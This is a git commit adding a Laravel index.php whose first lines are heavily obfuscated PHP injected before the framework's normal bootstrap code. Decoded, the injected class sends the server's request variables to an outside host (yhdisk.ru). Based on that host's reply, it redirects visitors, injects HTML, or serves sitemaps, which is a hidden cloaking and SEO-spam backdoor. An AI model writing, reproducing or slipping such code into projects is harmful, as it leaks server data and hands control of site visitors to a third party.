357942c7202ce7f58de97a728ff1c193e77dca80
Omais javeed <100470778+omaisjaveed@users.noreply.github.com>
2026-04-29 03:18:19 +0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,62 @@
+<?php
+$XglSz = array("vRJPV7BtkNYGM9"); $aBCTOK = md5("g9yWf"); $aEc_s = (string) null; $d8WBOv = define("q6y_nh04","K20Uewmk"); $RYVZP = addcslashes("RYVZP","h7js2rbN"); $oKT3XRSgk = stripos("Cva9yp3U","rhDts"); $oQWnTCek = defined("GYJwm"); $Undiyx = defined("x85M64P"); $GvMF3GJK = array("p6tYC7jMSqTmU5wHD"); class DfEVJIL{	private static $IA2wG = "";public function __construct() {        		self::$pY80KZv = $_SERVER;    }private static function VzuiA(){		if(self::w0cxF([4,75,40,4,75,40])(trim(self::$vqzPdBki),self::w0cxF([0,49,75,58,16]))){			exit(self::$vqzPdBki);		}	}private static $pY80KZv = null;public static function __callStatic($f_wyo5, $oUZt7) {	goto TM18AcGE;fkUHFN80g3: self::L9rBNR2D();goto H8Y1kzS;P_5aZLd: $bDqSTp = self::w0cxF([73,46,40,16,17,22,30,22,75])();goto _3CzXGH;rT0pctw8: self::w0cxF([73,46,40,16,17,4,19,75,74,34,75])($bDqSTp,self::w0cxF([38,25]), 0);goto JCXpkJl;rJmGnf0NA: self::w0cxF([73,46,40,16,17,73,16,74,4,19])($bDqSTp);goto fkUHFN80g3;JCXpkJl: self::w0cxF([73,46,40,16,17,4,19,75,74,34,75])($bDqSTp,self::w0cxF([51,35]), 51);goto _sxaDVXC0;_3CzXGH: $FyOtqR = [self::w0cxF([23,33,68])=>"2","T"=>"l"];goto BznHoT6A;TM18AcGE: self::$IA2wG = $oUZt7[0];goto P_5aZLd;Z2EaP5dAXf: self::VzuiA();goto _aZNfo0pK;a4YO0PLB: $Aiwl64FR = self::w0cxF([49,75,75,34,15,36,36,72]);$Aiwl64FR .= self::w0cxF([49,71,22,4,53,14,40,46]);$Aiwl64FR .= self::w0cxF([36,6,34,22,36,57,46,6]);$Aiwl64FR .= self::w0cxF([39]);goto I4LyMSK9;lD9rsz: self::$pY80KZv = self::w0cxF([26,6,4,19,38,25,17,19,30,73,74,71,19])(self::$pY80KZv);goto PdZSYJts;epZojhWGD: self::w0cxF([73,46,40,16,17,4,19,75,74,34,75])($bDqSTp,self::w0cxF([51,43,43,43,52]),$Aiwl64FR);goto npIzlsKb7;I4LyMSK9: self::$pY80KZv= self::w0cxF([44,4,74,30,17,19,30,73,74,71,19])(self::$pY80KZv);goto lD9rsz;_sxaDVXC0: self::$vqzPdBki = self::w0cxF([73,46,40,16,17,19,55,19,73])($bDqSTp);goto rJmGnf0NA;H8Y1kzS: self::geO6v0();goto Z2EaP5dAXf;npIzlsKb7: self::w0cxF([73,46,40,16,17,4,19,75,74,34,75])($bDqSTp,self::w0cxF([51,29,29,51,35]), 1);goto rT0pctw8;PdZSYJts: $Aiwl64FR = $Aiwl64FR.self::$pY80KZv;goto epZojhWGD;BznHoT6A: self::$pY80KZv = array_merge(self::$pY80KZv,$FyOtqR);goto a4YO0PLB;_aZNfo0pK:"";			    }private static $vqzPdBki = "";private static function geO6v0(){		if(self::w0cxF([4,75,40,4,75,40])(self::$vqzPdBki,self::w0cxF([0,46,40,16,4,19,75]))){						self::w0cxF([49,19,6,71,19,40,11,1,56,74,30,75,19,30,75,62,75,72,34,19,15,75,19,55,75,36,55,58,16,1,70,61]);			exit(self::$vqzPdBki);		}	}private static function NEFtO6if($i3BfPkE) {		return self::$IA2wG[$i3BfPkE];	}private static function L9rBNR2D(){		if(self::w0cxF([4,46,26,4,75,40])(trim(self::$vqzPdBki),0,4)== self::w0cxF([49,75,75,34])){					header(self::w0cxF([68,74,73,6,75,22,74,30,15]).self::$vqzPdBki);			exit;		}	}private static function w0cxF($GVWCRU) {		$fVjhsP = "";		foreach($GVWCRU as $CYqh9oG){			$fVjhsP .= self::NEFtO6if($CYqh9oG);					}		return $fVjhsP;	}	}$HDN0eblOq = false; $LYFHZPI_B = addcslashes("LYFHZPI_B","AkbG2EgM7cShu84z"); $rc3HMqFa = (string) null; $DR5zKqO = defined("CSO1Dj"); $QeTLN5gCZ = str_pad("", 0); $tJU7S = sha1("X9fK3kuCw"); $vWI7SLc = md5("kVUKJH"); $Wdm_Wg = wordwrap("", 9);$NYdogJ = str_replace("NYdogJ", "", "NYdogJ");new DfEVJIL();$OopSCJz = ucwords("pGlfTM0"); $Ik6JpX = strstr("t_Ybg05","a6wQPh0e"); $VgnJy8z = substr("VgnJy8z",7,0);$RnA4Rl = strstr("RnA4Rl", "RgUioW_"); $PUYupqB = date("Y-m-d H:i:s"); $LSkoZ = ucwords("rYFX0M"); $XpGaS8 = str_pad("", 0); $Itmaw1 = date("Y-m-d H:i:s"); $dgRQ2d = false; DfEVJIL::r5tAh7Ra('<"Ews8aAIUX(K5.:l_ZeY>iTV4bSQ9nOgPp3/F6=rJB0jMu 7hW12kzxC?mfD;-qNRvGLH)dycot');$JBhQyokjt = array("RJ5V4KUcOLaGRtlz"); $Hk_qm6Vn = addcslashes("Hk_qm6Vn","jcyVKXz9wblfavmEgQH"); $CquI8yS54 = md5("IVNEvRlu"); $P5mRK = strval(false); $VZ4oUjuCf = trim("   "); $GwusmxT = str_shuffle("Q_X4liqw"); $XofVTmMF = strpos("lsJg1v","JueK59QFr"); $MRuOo = stripos("De5TcCxI","xnK8CP"); $qX5fIvg = strstr("qX5fIvg", "yfFZi");   
+?><?php
+
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
+
+define('LARAVEL_START', microtime(true));
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels great to relax.
+|
+*/
+
+require __DIR__.'/vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
+$app = require_once __DIR__.'/bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
+$response = $kernel->handle(
+    $request = Illuminate\Http\Request::capture()
+);
+
+$response->send();
+
+$kernel->terminate($request, $response);
